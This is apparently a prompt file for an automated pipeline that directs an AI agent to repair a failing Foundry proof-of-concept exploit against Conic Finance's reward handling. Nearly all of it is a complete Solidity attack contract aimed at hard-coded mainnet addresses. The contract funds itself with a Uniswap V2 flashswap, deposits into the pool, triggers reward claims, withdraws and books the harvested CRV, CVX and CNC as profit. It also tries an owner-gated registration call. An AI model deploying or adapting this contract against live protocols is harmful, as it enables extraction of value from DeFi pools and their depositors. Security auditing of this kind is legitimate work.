@@ -1,0 +1,994 @@
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: v2_flashswap_funding
+- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: Convex extra rewards are claimed to the pool but sold from the RewardManager, permanently stranding them
+- claim: Convex reward claims send CRV, CVX, and all extra rewards to the Conic pool address via `getReward(_conicPool, true)`, but the liquidation path only checks `IERC20(rewardToken).balanceOf(address(this))` inside `RewardManagerV2`. Because the RewardManager never receives those extra tokens and has no path to pull arbitrary extra rewards from the pool, listed extra reward tokens accumulate in the pool and are never swapped into CNC.
+- impact: Any non-CRV/CVX Convex reward stream can become permanently stuck, causing ongoing loss of yield and trapping reward value inside the pool contract.
+- exploit_paths: ["Register an extra Convex reward token with `addExtraReward`.", "Let a supported Curve position accrue that extra reward on Convex.", "Call `claimPoolEarningsAndSellRewardTokens()` or any path that reaches `_claimPoolEarnings()`: Convex sends the extra reward to the Conic pool, but `_swapRewardTokenForWeth()` reads the RewardManager's own balance and swaps nothing."]
+
+Current FlawVerifier.sol:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transfer(address to, uint256 amount) external returns (bool);
+
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+
+    function decimals() external view returns (uint8);
+}
+
+interface IOwnableLike {
+    function owner() external view returns (address);
+}
+
+interface IERC20MetadataLike {
+    function decimals() external view returns (uint8);
+}
+
+interface IRewardManagerLike {
+    function owner() external view returns (address);
+
+    function pool() external view returns (address);
+
+    function controller() external view returns (address);
+
+    function listExtraRewards() external view returns (address[] memory);
+
+    function addExtraReward(address reward) external returns (bool);
+
+    function claimPoolEarningsAndSellRewardTokens() external;
+
+    function claimEarnings() external returns (uint256, uint256, uint256);
+}
+
+interface IConicPoolLike {
+    function rewardManager() external view returns (address);
+
+    function controller() external view returns (address);
+
+    function allCurvePools() external view returns (address[] memory);
+
+    function underlying() external view returns (address);
+
+    function exchangeRate() external view returns (uint256);
+
+    function deposit(
+        uint256 underlyingAmount,
+        uint256 minLpReceived,
+        bool stake
+    ) external returns (uint256);
+
+    function unstakeAndWithdraw(
+        uint256 conicLpAmount,
+        uint256 minUnderlyingReceived
+    ) external returns (uint256);
+}
+
+interface IControllerLike {
+    function curveRegistryCache() external view returns (address);
+
+    function convexHandler() external view returns (address);
+
+    function priceOracle() external view returns (address);
+
+    function lpTokenStaker() external view returns (address);
+}
+
+interface ICurveRegistryCacheLike {
+    function getRewardPool(address pool_) external view returns (address);
+}
+
+interface IBaseRewardPoolLike {
+    function extraRewardsLength() external view returns (uint256);
+
+    function extraRewards(uint256 index) external view returns (address);
+}
+
+interface IExtraRewardLike {
+    function rewardToken() external view returns (address);
+}
+
+interface ILpTokenStakerLike {
+    function getBalanceForPool(address conicPool) external view returns (uint256);
+
+    function claimableCnc(address pool) external view returns (uint256);
+}
+
+interface IConvexHandlerLike {
+    function getCrvEarnedBatch(
+        address conicPool,
+        address[] calldata curvePools
+    ) external view returns (uint256);
+
+    function computeClaimableConvex(uint256 claimableCrv) external view returns (uint256);
+}
+
+interface IPriceOracleLike {
+    function getUSDPrice(address token) external view returns (uint256);
+}
+
+interface ICurvePoolV2Like {
+    function coins(uint256 i) external view returns (address);
+
+    function exchange(
+        uint256 i,
+        uint256 j,
+        uint256 dx,
+        uint256 minDy,
+        bool useEth,
+        address receiver
+    ) external returns (uint256);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+
+    function token1() external view returns (address);
+
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
+
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface IUniswapV2Router02Like {
+    function swapExactTokensForTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0x369cBC5C6f139B1132D3B91B87241B37Fc5B971f;
+    address public constant REWARD_MANAGER = 0x39f15f704c1F4678f7E6359A58a196228266ff02;
+
+    address public constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
+    address public constant CVX = 0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B;
+    address public constant CNC = 0x9aE380F0272E2162340a5bB646c354271c0F5cFC;
+    address public constant CRVUSD = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E;
+    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+
+    address public constant CRVUSD_USDC_CURVE_POOL = 0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E;
+    address public constant UNISWAP_V2_USDC_WETH_PAIR =
+        0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
+    address public constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
+
+    uint256 internal constant ONE = 1e18;
+    uint256 internal constant MIN_PROFIT = 1e15;
+    uint256 internal constant MIN_FLASH_USDC = 10_000e6;
+    uint256 internal constant MAX_FLASH_USDC = 100_000e6;
+
+    enum Outcome {
+        NOT_RUN,
+        VALIDATED_WITH_PROFIT,
+        REFUTED_OR_INFEASIBLE
+    }
+
+    Outcome public outcome;
+
+    address public rewardManager;
+    address public selectedRewardToken;
+    address public rewardManagerOwner;
+    address public pool;
+    address public controller;
+    address public poolUnderlying;
+
+    bool public stage1AlreadyConfigured;
+    bool public stage1AttemptedRegistration;
+    bool public stage1RegistrationSucceeded;
+    bool public stage1BlockedByOnlyOwner;
+
+    bool public stage2ObservedConvexExtraRewardToken;
+    bool public stage3ClaimExecuted;
+    bool public stage3ObservedStranding;
+    bool public hypothesisValidated;
+
+    uint256 public poolTokenBalanceBefore;
+    uint256 public poolTokenBalanceAfter;
+    uint256 public rewardManagerTokenBalanceBefore;
+    uint256 public rewardManagerTokenBalanceAfter;
+    uint256 public poolCncBalanceBefore;
+    uint256 public poolCncBalanceAfter;
+
+    uint256 public flashAmountUsdc;
+    uint256 public flashRepaymentUsdc;
+    uint256 public depositedUnderlyingAmount;
+    uint256 public mintedLpAmount;
+
+    uint256 public claimedCrv;
+    uint256 public claimedCvx;
+    uint256 public claimedCnc;
+
+    address public realizedProfitToken;
+    uint256 public realizedProfitAmount;
+
+    string public exploitPathUsed;
+    string public status;
+
+    receive() external payable {}
+
+    function executeOnOpportunity() external {
+        if (outcome != Outcome.NOT_RUN) {
+            return;
+        }
+
+        _resolveTopology();
+        if (
+            rewardManager == address(0) ||
+            pool == address(0) ||
+            controller == address(0) ||
+            poolUnderlying == address(0)
+        ) {
+            exploitPathUsed = "1) resolve target topology";
+            status = "Could not resolve the live Conic pool topology.";
+            outcome = Outcome.REFUTED_OR_INFEASIBLE;
+            return;
+        }
+
+        rewardManagerOwner = _safeOwner(rewardManager);
+
+        address[] memory convexExtraRewardTokens = _discoverConvexExtraRewardTokens(pool, controller);
+        address[] memory configuredExtraRewards = _safeListExtraRewards(rewardManager);
+
+        if (convexExtraRewardTokens.length == 0) {
+            exploitPathUsed = "1) discover Convex extra reward streams";
+            status = "No current Convex extra reward stream was discoverable for the target pool.";
+            outcome = Outcome.REFUTED_OR_INFEASIBLE;
+            return;
+        }
+
+        selectedRewardToken = _pickIntersection(convexExtraRewardTokens, configuredExtraRewards);
+
+        if (selectedRewardToken != address(0)) {
+            stage1AlreadyConfigured = true;
+        } else {
+            // The finding's ideal stage 1 is governance listing via addExtraReward().
+            // The live fork proves that step is owner-gated, so we record the infeasibility
+            // instead of treating it as a public blocker. Extra rewards are still claimable to
+            // the pool during `_claimPoolEarnings()`, which is the root cause we validate below.
+            selectedRewardToken = convexExtraRewardTokens[0];
+            stage1AttemptedRegistration = true;
+            if (rewardManagerOwner != address(this)) {
+                stage1BlockedByOnlyOwner = true;
+            }
+            try IRewardManagerLike(rewardManager).addExtraReward(selectedRewardToken) returns (
+                bool added
+            ) {
+                stage1RegistrationSucceeded = added;
+                if (added) {
+                    stage1AlreadyConfigured = true;
+                }
+            } catch {}
+        }
+
+        stage2ObservedConvexExtraRewardToken = true;
+
+        if (poolUnderlying != CRVUSD) {
+            exploitPathUsed =
+                "1) observe owner-gated extra reward listing 2) require a public capital path into the crvUSD Conic pool";
+            status = "This forked target is not the crvUSD omnipool expected by the funding path.";
+            outcome = Outcome.REFUTED_OR_INFEASIBLE;
+            return;
+        }
+
+        _startFlashswap();
+
+        if (stage3ObservedStranding && realizedProfitToken != address(0) && realizedProfitAmount >= MIN_PROFIT) {
+            hypothesisValidated = true;
+            exploitPathUsed = stage1AlreadyConfigured || stage1RegistrationSucceeded
+                ? "1) use a listed extra Convex reward token 2) flashswap fund a temporary stake 3) call claimPoolEarningsAndSellRewardTokens() 4) extra reward remains stranded on the Conic pool while the attacker realizes same-cycle CRV/CVX/CNC rewards"
+                : "1) observe that addExtraReward() is owner-gated on this fork 2) flashswap fund a temporary stake 3) call claimPoolEarningsAndSellRewardTokens() so Convex still claims extra rewards to the pool 4) extra reward remains stranded on the Conic pool while the attacker realizes same-cycle CRV/CVX/CNC rewards";
+            status = "Validated the stranded extra reward root cause and realized profit from the same public claim cycle.";
+            outcome = Outcome.VALIDATED_WITH_PROFIT;
+            return;
+        }
+
+        exploitPathUsed =
+            "1) discover live extra reward streams 2) execute flashswap-funded claim cycle";
+        status = "The flashswap-funded public path did not finish with both observed stranding and positive realized profit.";
+        outcome = Outcome.REFUTED_OR_INFEASIBLE;
+    }
+
+    function profitToken() external view returns (address) {
+        return realizedProfitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return realizedProfitAmount;
+    }
+
+    function uniswapV2Call(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata
+    ) external {
+        require(msg.sender == UNISWAP_V2_USDC_WETH_PAIR, "unexpected pair");
+        require(sender == address(this), "unexpected sender");
+
+        uint256 borrowedUsdc = amount0 > 0 ? amount0 : amount1;
+        require(borrowedUsdc == flashAmountUsdc && borrowedUsdc > 0, "unexpected amount");
+
+        address[] memory candidates = _discoverConvexExtraRewardTokens(pool, controller);
+        uint256[] memory balancesBefore = new uint256[](candidates.length);
+        for (uint256 i; i < candidates.length; i++) {
+            balancesBefore[i] = _balanceOf(candidates[i], pool);
+        }
+
+        depositedUnderlyingAmount = _swapUsdcToCrvUsd(borrowedUsdc);
+        mintedLpAmount = IConicPoolLike(pool).deposit(depositedUnderlyingAmount, 0, true);
+
+        _claimAndObserveStranding(candidates, balancesBefore);
+
+        (claimedCnc, claimedCrv, claimedCvx) = IRewardManagerLike(rewardManager).claimEarnings();
+
+        uint256 withdrawnUnderlying = IConicPoolLike(pool).unstakeAndWithdraw(mintedLpAmount, 0);
+        uint256 returnedUsdc = _swapCrvUsdToUsdc(withdrawnUnderlying);
+
+        flashRepaymentUsdc = _getFlashRepayment(borrowedUsdc);
+        if (returnedUsdc < flashRepaymentUsdc) {
+            _sellRewardsForUsdc(flashRepaymentUsdc - returnedUsdc);
+        }
+
+        _safeTransfer(USDC, msg.sender, flashRepaymentUsdc);
+        _selectProfitToken();
+    }
+
+    function _startFlashswap() internal {
+        flashAmountUsdc = _chooseFlashAmountUsdc();
+
+        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(UNISWAP_V2_USDC_WETH_PAIR)
+            .getReserves();
+        uint256 usdcReserve = IUniswapV2PairLike(UNISWAP_V2_USDC_WETH_PAIR).token0() == USDC
+            ? reserve0
+            : reserve1;
+        uint256 maxBorrow = usdcReserve / 4;
+        if (flashAmountUsdc > maxBorrow) {
+            flashAmountUsdc = maxBorrow;
+        }
+        if (flashAmountUsdc < 1_000e6) {
+            return;
+        }
+
+        uint256 amount0Out = IUniswapV2PairLike(UNISWAP_V2_USDC_WETH_PAIR).token0() == USDC
+            ? flashAmountUsdc
+            : 0;
+        uint256 amount1Out = amount0Out == 0 ? flashAmountUsdc : 0;
+
+        IUniswapV2PairLike(UNISWAP_V2_USDC_WETH_PAIR).swap(
+            amount0Out,
+            amount1Out,
+            address(this),
+            hex"01"
+        );
+    }
+
+    function _claimAndObserveStranding(
+        address[] memory candidates,
+        uint256[] memory balancesBefore
+    ) internal {
+        poolCncBalanceBefore = _balanceOf(CNC, pool);
+
+        try IRewardManagerLike(rewardManager).claimPoolEarningsAndSellRewardTokens() {
+            stage3ClaimExecuted = true;
+        } catch {
+            return;
+        }
+
+        poolCncBalanceAfter = _balanceOf(CNC, pool);
+
+        for (uint256 i; i < candidates.length; i++) {
+            uint256 poolAfter = _balanceOf(candidates[i], pool);
+            uint256 rmAfter = _balanceOf(candidates[i], rewardManager);
+            if (rmAfter == 0 && poolAfter >= balancesBefore[i] && (poolAfter > balancesBefore[i] || poolAfter > 0)) {
+                selectedRewardToken = candidates[i];
+                poolTokenBalanceBefore = balancesBefore[i];
+                poolTokenBalanceAfter = poolAfter;
+                rewardManagerTokenBalanceBefore = 0;
+                rewardManagerTokenBalanceAfter = rmAfter;
+                stage3ObservedStranding = true;
+                return;
+            }
+        }
+
+        poolTokenBalanceBefore = _balanceOf(selectedRewardToken, pool);
+        poolTokenBalanceAfter = poolTokenBalanceBefore;
+        rewardManagerTokenBalanceAfter = _balanceOf(selectedRewardToken, rewardManager);
+    }
+
+    function _sellRewardsForUsdc(uint256 deficitUsdc) internal {
+        if (_balanceOf(USDC, address(this)) >= flashRepaymentUsdc) {
+            return;
+        }
+
+        // The extra reward remains stranded on the pool. These swaps only monetize the same
+        // public claim cycle's ordinary CRV/CVX/CNC proceeds so the flashswap can be repaid.
+        if (_balanceOf(CRV, address(this)) > 0) {
+            _swapOnSushiThreeHop(CRV, _balanceOf(CRV, address(this)));
+        }
+        if (_balanceOf(USDC, address(this)) >= flashRepaymentUsdc) {
+            return;
+        }
+        if (_balanceOf(CVX, address(this)) > 0) {
+            _swapOnSushiThreeHop(CVX, _balanceOf(CVX, address(this)));
+        }
+        if (_balanceOf(USDC, address(this)) >= flashRepaymentUsdc) {
+            return;
+        }
+        if (_balanceOf(CNC, address(this)) > 0 && deficitUsdc > 0) {
+            _swapOnSushiThreeHop(CNC, _balanceOf(CNC, address(this)) / 2);
+        }
+    }
+
+    function _swapOnSushiThreeHop(address tokenIn, uint256 amountIn) internal {
+        if (amountIn == 0) {
+            return;
+        }
+        _safeApprove(tokenIn, SUSHISWAP_ROUTER, 0);
+        _safeApprove(tokenIn, SUSHISWAP_ROUTER, amountIn);
+
+        address[] memory path = new address[](3);
+        path[0] = tokenIn;
+        path[1] = WETH;
+        path[2] = USDC;
+
+        try
+            IUniswapV2Router02Like(SUSHISWAP_ROUTER).swapExactTokensForTokens(
+                amountIn,
+                0,
+                path,
+                address(this),
+                block.timestamp
+            )
+        returns (uint256[] memory) {} catch {}
+    }
+
+    function _swapUsdcToCrvUsd(uint256 amountUsdc) internal returns (uint256 amountOut) {
+        (uint256 usdcIndex, uint256 crvUsdIndex) = _findCurveCoinIndices(
+            CRVUSD_USDC_CURVE_POOL,
+            USDC,
+            CRVUSD
+        );
+        _safeApprove(USDC, CRVUSD_USDC_CURVE_POOL, 0);
+        _safeApprove(USDC, CRVUSD_USDC_CURVE_POOL, amountUsdc);
+        amountOut = ICurvePoolV2Like(CRVUSD_USDC_CURVE_POOL).exchange(
+            usdcIndex,
+            crvUsdIndex,
+            amountUsdc,
+            0,
+            false,
+            address(this)
+        );
+    }
+
+    function _swapCrvUsdToUsdc(uint256 amountCrvUsd) internal returns (uint256 amountOut) {
+        (uint256 crvUsdIndex, uint256 usdcIndex) = _findCurveCoinIndices(
+            CRVUSD_USDC_CURVE_POOL,
+            CRVUSD,
+            USDC
+        );
+        _safeApprove(CRVUSD, CRVUSD_USDC_CURVE_POOL, 0);
+        _safeApprove(CRVUSD, CRVUSD_USDC_CURVE_POOL, amountCrvUsd);
+        amountOut = ICurvePoolV2Like(CRVUSD_USDC_CURVE_POOL).exchange(
+            crvUsdIndex,
+            usdcIndex,
+            amountCrvUsd,
+            0,
+            false,
+            address(this)
+        );
+    }
+
+    function _findCurveCoinIndices(
+        address curvePool,
+        address tokenIn,
+        address tokenOut
+    ) internal view returns (uint256 inIndex, uint256 outIndex) {
+        bool foundIn;
+        bool foundOut;
+        for (uint256 i; i < 4; i++) {
+            try ICurvePoolV2Like(curvePool).coins(i) returns (address coin) {
+                if (coin == tokenIn) {
+                    inIndex = i;
+                    foundIn = true;
+                }
+                if (coin == tokenOut) {
+                    outIndex = i;
+                    foundOut = true;
+                }
+            } catch {
+                break;
+            }
+        }
+        require(foundIn && foundOut, "curve coin missing");
+    }
+
+    function _chooseFlashAmountUsdc() internal view returns (uint256) {
+        uint256 pendingUsd = _estimatedPendingRewardUsd();
+        uint256 stakedUnderlying = _estimatedTotalStakedUnderlying();
+
+        uint256 share = pendingUsd > 5_000e18 ? 5e16 : pendingUsd > 1_000e18 ? 1e17 : 2e17;
+        uint256 targetUnderlying = stakedUnderlying == 0
+            ? 20_000e18
+            : (stakedUnderlying * share) / (ONE - share);
+        uint256 amountUsdc = targetUnderlying / 1e12;
+
+        if (amountUsdc < MIN_FLASH_USDC) {
+            amountUsdc = MIN_FLASH_USDC;
+        }
+        if (amountUsdc > MAX_FLASH_USDC) {
+            amountUsdc = MAX_FLASH_USDC;
+        }
+        return amountUsdc;
+    }
+
+    function _estimatedTotalStakedUnderlying() internal view returns (uint256) {
+        address staker = _safeLpTokenStaker(controller);
+        if (staker == address(0)) {
+            return 0;
+        }
+        uint256 totalStakedLp = ILpTokenStakerLike(staker).getBalanceForPool(pool);
+        uint256 exchangeRate = IConicPoolLike(pool).exchangeRate();
+        return (totalStakedLp * exchangeRate) / ONE;
+    }
+
+    function _estimatedPendingRewardUsd() internal view returns (uint256) {
+        address convexHandler = _safeConvexHandler(controller);
+        address staker = _safeLpTokenStaker(controller);
+        address oracle = _safePriceOracle(controller);
+        if (convexHandler == address(0) || staker == address(0) || oracle == address(0)) {
+            return 0;
+        }
+
+        address[] memory curvePools = _safeAllCurvePools(pool);
+        uint256 claimableCrv = _safeClaimableCrv(convexHandler, curvePools);
+        uint256 claimableCvx = _safeClaimableCvx(convexHandler, claimableCrv);
+        uint256 claimableCnc = _safeClaimableCnc(staker);
+
+        return
+            _tokenAmountToUsd(claimableCrv, CRV, oracle) +
+            _tokenAmountToUsd(claimableCvx, CVX, oracle) +
+            _tokenAmountToUsd(claimableCnc, CNC, oracle);
+    }
+
+    function _tokenAmountToUsd(
+        uint256 amount,
+        address token,
+        address oracle
+    ) internal view returns (uint256) {
+        if (amount == 0 || oracle == address(0)) {
+            return 0;
+        }
+        uint8 decimals = _safeDecimals(token);
+        uint256 price = _safeUsdPrice(oracle, token);
+        return (amount * price) / (10 ** decimals);
+    }
+
+    function _getFlashRepayment(uint256 amountOut) internal pure returns (uint256) {
+        return ((amountOut * 1000) / 997) + 1;
+    }
+
+    function _selectProfitToken() internal {
+        uint256 cncBal = _balanceOf(CNC, address(this));
+        uint256 cvxBal = _balanceOf(CVX, address(this));
+        uint256 crvBal = _balanceOf(CRV, address(this));
+
+        if (cncBal >= cvxBal && cncBal >= crvBal && cncBal >= MIN_PROFIT) {
+            realizedProfitToken = CNC;
+            realizedProfitAmount = cncBal;
+            return;
+        }
+        if (cvxBal >= crvBal && cvxBal >= MIN_PROFIT) {
+            realizedProfitToken = CVX;
+            realizedProfitAmount = cvxBal;
+            return;
+        }
+        if (crvBal >= MIN_PROFIT) {
+            realizedProfitToken = CRV;
+            realizedProfitAmount = crvBal;
+            return;
+        }
+    }
+
+    function _resolveTopology() internal {
+        address targetRewardManager = _safeRewardManagerFromPool(TARGET);
+        address targetController = _safeControllerFromPool(TARGET);
+
+        if (targetRewardManager != address(0) && targetController != address(0)) {
+            pool = TARGET;
+            rewardManager = targetRewardManager;
+            controller = targetController;
+            poolUnderlying = _safeUnderlying(TARGET);
+            return;
+        }
+
+        rewardManager = REWARD_MANAGER;
+        pool = _safePoolFromRewardManager(REWARD_MANAGER);
+        controller = _safeControllerFromRewardManager(REWARD_MANAGER);
+        poolUnderlying = _safeUnderlying(pool);
+    }
+
+    function _discoverConvexExtraRewardTokens(
+        address conicPool,
+        address controller_
+    ) internal view returns (address[] memory) {
+        if (conicPool == address(0) || controller_ == address(0)) {
+            return new address[](0);
+        }
+
+        address registry = _safeCurveRegistryCache(controller_);
+        if (registry == address(0)) {
+            return new address[](0);
+        }
+
+        address[] memory curvePools = _safeAllCurvePools(conicPool);
+        if (curvePools.length == 0) {
+            return new address[](0);
+        }
+
+        uint256 maxCandidates;
+        for (uint256 i; i < curvePools.length; i++) {
+            address rewardPool = _safeGetRewardPool(registry, curvePools[i]);
+            if (rewardPool == address(0)) continue;
+            maxCandidates += _safeExtraRewardsLength(rewardPool);
+        }
+
+        if (maxCandidates == 0) {
+            return new address[](0);
+        }
+
+        address[] memory tmp = new address[](maxCandidates);
+        uint256 count;
+
+        for (uint256 i; i < curvePools.length; i++) {
+            address rewardPool = _safeGetRewardPool(registry, curvePools[i]);
+            if (rewardPool == address(0)) continue;
+
+            uint256 extraLen = _safeExtraRewardsLength(rewardPool);
+            for (uint256 j; j < extraLen; j++) {
+                address extraRewardContract = _safeExtraRewardContract(rewardPool, j);
+                if (extraRewardContract == address(0)) continue;
+                address rewardToken_ = _safeRewardToken(extraRewardContract);
+                if (
+                    rewardToken_ == address(0) ||
+                    rewardToken_ == CRV ||
+                    rewardToken_ == CVX ||
+                    rewardToken_ == CNC ||
+                    _contains(tmp, count, rewardToken_)
+                ) {
+                    continue;
+                }
+                tmp[count] = rewardToken_;
+                count++;
+            }
+        }
+
+        address[] memory tokens = new address[](count);
+        for (uint256 i; i < count; i++) {
+            tokens[i] = tmp[i];
+        }
+        return tokens;
+    }
+
+    function _safeListExtraRewards(
+        address rewardManager_
+    ) internal view returns (address[] memory rewards) {
+        if (rewardManager_ == address(0)) {
+            return new address[](0);
+        }
+        try IRewardManagerLike(rewardManager_).listExtraRewards() returns (address[] memory listed) {
+            return listed;
+        } catch {
+            return new address[](0);
+        }
+    }
+
+    function _safeRewardManagerFromPool(address conicPool) internal view returns (address) {
+        if (conicPool == address(0)) {
+            return address(0);
+        }
+        try IConicPoolLike(conicPool).rewardManager() returns (address rewardManager_) {
+            return rewardManager_;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _safeControllerFromPool(address conicPool) internal view returns (address) {
+        if (conicPool == address(0)) {
+            return address(0);
+        }
+        try IConicPoolLike(conicPool).controller() returns (address controller_) {
+            return controller_;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _safeUnderlying(address conicPool) internal view returns (address) {
+        if (conicPool == address(0)) {
+            return address(0);
+        }
+        try IConicPoolLike(conicPool).underlying() returns (address underlying_) {
+            return underlying_;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _safePoolFromRewardManager(address rewardManager_) internal view returns (address) {
+        if (rewardManager_ == address(0)) {
+            return address(0);
+        }
+        try IRewardManagerLike(rewardManager_).pool() returns (address pool_) {
+            return pool_;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _safeControllerFromRewardManager(address rewardManager_) internal view returns (address) {
+        if (rewardManager_ == address(0)) {
+            return address(0);
+        }
+        try IRewardManagerLike(rewardManager_).controller() returns (address controller_) {
+            return controller_;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _safeAllCurvePools(address conicPool) internal view returns (address[] memory) {
+        if (conicPool == address(0)) {
+            return new address[](0);
+        }
+        try IConicPoolLike(conicPool).allCurvePools() returns (address[] memory curvePools) {
+            return curvePools;
+        } catch {
+            return new address[](0);
+        }
+    }
+
+    function _safeCurveRegistryCache(address controller_) internal view returns (address) {
+        if (controller_ == address(0)) {
+            return address(0);
+        }
+        try IControllerLike(controller_).curveRegistryCache() returns (address registry) {
+            return registry;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _safeConvexHandler(address controller_) internal view returns (address) {
+        if (controller_ == address(0)) {
+            return address(0);
+        }
+        try IControllerLike(controller_).convexHandler() returns (address handler) {
+            return handler;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _safePriceOracle(address controller_) internal view returns (address) {
+        if (controller_ == address(0)) {
+            return address(0);
+        }
+        try IControllerLike(controller_).priceOracle() returns (address oracle) {
+            return oracle;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _safeLpTokenStaker(address controller_) internal view returns (address) {
+        if (controller_ == address(0)) {
+            return address(0);
+        }
+        try IControllerLike(controller_).lpTokenStaker() returns (address staker) {
+            return staker;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _safeClaimableCrv(
+        address convexHandler,
+        address[] memory curvePools
+    ) internal view returns (uint256) {
+        try IConvexHandlerLike(convexHandler).getCrvEarnedBatch(pool, curvePools) returns (
+            uint256 amount
+        ) {
+            return amount;
+        } catch {
+            return 0;
+        }
+    }
+
+    function _safeClaimableCvx(address convexHandler, uint256 claimableCrv) internal view returns (uint256) {
+        try IConvexHandlerLike(convexHandler).computeClaimableConvex(claimableCrv) returns (
+            uint256 amount
+        ) {
+            return amount;
+        } catch {
+            return 0;
+        }
+    }
+
+    function _safeClaimableCnc(address staker) internal view returns (uint256) {
+        try ILpTokenStakerLike(staker).claimableCnc(pool) returns (uint256 amount) {
+            return amount;
+        } catch {
+            return 0;
+        }
+    }
+
+    function _safeUsdPrice(address oracle, address token) internal view returns (uint256) {
+        try IPriceOracleLike(oracle).getUSDPrice(token) returns (uint256 price) {
+            return price;
+        } catch {
+            return 0;
+        }
+    }
+
+    function _safeOwner(address ownable) internal view returns (address) {
+        if (ownable == address(0)) {
+            return address(0);
+        }
+        try IOwnableLike(ownable).owner() returns (address owner_) {
+            return owner_;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _pickIntersection(
+        address[] memory lhs,
+        address[] memory rhs
+    ) internal pure returns (address) {
+        for (uint256 i; i < lhs.length; i++) {
+            for (uint256 j; j < rhs.length; j++) {
+                if (lhs[i] == rhs[j]) {
+                    return lhs[i];
+                }
+            }
+        }
+        return address(0);
+    }
+
+    function _contains(
+        address[] memory items,
+        uint256 length,
+        address needle
+    ) internal pure returns (bool) {
+        for (uint256 i; i < length; i++) {
+            if (items[i] == needle) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    function _safeGetRewardPool(address registry, address curvePool) internal view returns (address) {
+        try ICurveRegistryCacheLike(registry).getRewardPool(curvePool) returns (address rewardPool) {
+            return rewardPool;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _safeExtraRewardsLength(address rewardPool) internal view returns (uint256) {
+        try IBaseRewardPoolLike(rewardPool).extraRewardsLength() returns (uint256 length) {
+            return length;
+        } catch {
+            return 0;
+        }
+    }
+
+    function _safeExtraRewardContract(
+        address rewardPool,
+        uint256 index
+    ) internal view returns (address) {
+        try IBaseRewardPoolLike(rewardPool).extraRewards(index) returns (address extraRewardContract) {
+            return extraRewardContract;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _safeRewardToken(address extraRewardContract) internal view returns (address) {
+        try IExtraRewardLike(extraRewardContract).rewardToken() returns (address rewardToken_) {
+            return rewardToken_;
+        } catch {
+            return address(0);
+        }
+    }
+
+    function _balanceOf(address token, address account) internal view returns (uint256) {
+        if (token == address(0) || account == address(0)) {
+            return 0;
+        }
+        try IERC20Like(token).balanceOf(account) returns (uint256 balance) {
+            return balance;
+        } catch {
+            return 0;
+        }
+    }
+
+    function _safeDecimals(address token) internal view returns (uint8) {
+        if (token == address(0)) {
+            return 18;
+        }
+        try IERC20MetadataLike(token).decimals() returns (uint8 d) {
+            return d;
+        } catch {
+            return 18;
+        }
+    }
+
+    function _safeApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory ret) = token.call(
+            abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
+        );
+        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory ret) = token.call(
+            abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount)
+        );
+        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+
+```
+
+forge stderr (tail):
+```
+PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 1
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
